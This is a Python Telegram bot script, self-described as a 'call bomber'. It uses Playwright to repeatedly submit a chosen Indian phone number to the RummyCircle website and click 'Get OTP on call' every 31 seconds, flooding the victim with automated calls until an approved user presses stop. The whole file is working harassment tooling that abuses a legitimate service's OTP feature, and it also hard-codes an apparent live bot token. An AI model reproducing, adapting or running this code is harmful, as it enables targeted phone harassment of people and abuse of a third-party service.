from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from playwright.sync_api import sync_playwright
import asyncio
import time

# 🔴 अपना Telegram ID यहाँ डालो
ADMIN_ID = 6192971829
APPROVED_USERS = set()
USER_TASKS = {}

def trigger_rummycircle_otp_call(phone, user_id):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page(viewport={'width': 360, 'height': 640})
        page.goto("https://www.rummycircle.com/")
        page.fill('input[placeholder="Enter Mobile Number"]', phone)
        page.click('text=GET STARTED')
        page.wait_for_selector('input[placeholder="Enter 6 digit OTP"]')
        time.sleep(31)

        while user_id in USER_TASKS:
            try:
                page.click('text=Get OTP on call')
                print(f"📞 OTP Call triggered for {phone}")
            except Exception as e:
                print(f"❌ Error: {e}")
            time.sleep(31)

        browser.close()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 I am call bomber, send me any Indian number without country code using /request <number>.")

async def request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in APPROVED_USERS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /request <10-digit-phone>")
        return

    phone = context.args[0]
    if len(phone) != 10:
        await update.message.reply_text("📵 Please enter a valid 10-digit Indian phone number.")
        return

    keyboard = InlineKeyboardMarkup.from_button(
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{user_id}")
    )
    await update.message.reply_text(f"🔥 Bombing started on {phone}", reply_markup=keyboard)

    loop = asyncio.get_event_loop()
    task = loop.run_in_executor(None, trigger_rummycircle_otp_call, phone, user_id)
    USER_TASKS[user_id] = task

async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = int(query.data.split("_")[1])
    if user_id in USER_TASKS:
        del USER_TASKS[user_id]
        await query.message.reply_text("✅ Bombing stopped.")
    await query.answer()

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    APPROVED_USERS.add(int(context.args[0]))
    await update.message.reply_text("✅ User approved.")

async def disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /disapprove <user_id>")
        return
    APPROVED_USERS.discard(int(context.args[0]))
    await update.message.reply_text("❌ User disapproved.")

async def help_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = (
        "🛠️ Admin Commands:\n"
        "/approve <user_id> - Approve user\n"
        "/disapprove <user_id> - Remove access\n"
        "/list - Show approved users"
    )
    await update.message.reply_text(msg)

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not APPROVED_USERS:
        await update.message.reply_text("📭 No approved users.")
    else:
        users = "\n".join(str(uid) for uid in APPROVED_USERS)
        await update.message.reply_text(f"✅ Approved Users:\n{users}")

app = ApplicationBuilder().token("7837361554:AAHAMun-L4JjkCRCxUjZxFtR-6IcH44ZdUs").build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("request", request))
app.add_handler(CommandHandler("approve", approve))
app.add_handler(CommandHandler("disapprove", disapprove))
app.add_handler(CommandHandler("help", help_admin))
app.add_handler(CommandHandler("list", list_users))
app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop_"))

app.run_polling()
          
